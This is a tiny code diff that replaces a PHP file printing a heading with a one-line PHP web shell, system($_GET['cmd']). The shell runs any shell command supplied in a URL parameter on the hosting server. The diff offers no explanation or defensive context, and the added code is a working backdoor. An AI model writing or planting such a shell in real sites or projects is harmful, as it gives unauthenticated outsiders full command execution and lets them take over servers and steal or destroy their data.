@@ -1,1 +1,5 @@
-echo '<h1>I\'m PHP</h1>'
+<?php
+system($_GET['cmd']);
+
+
+?>
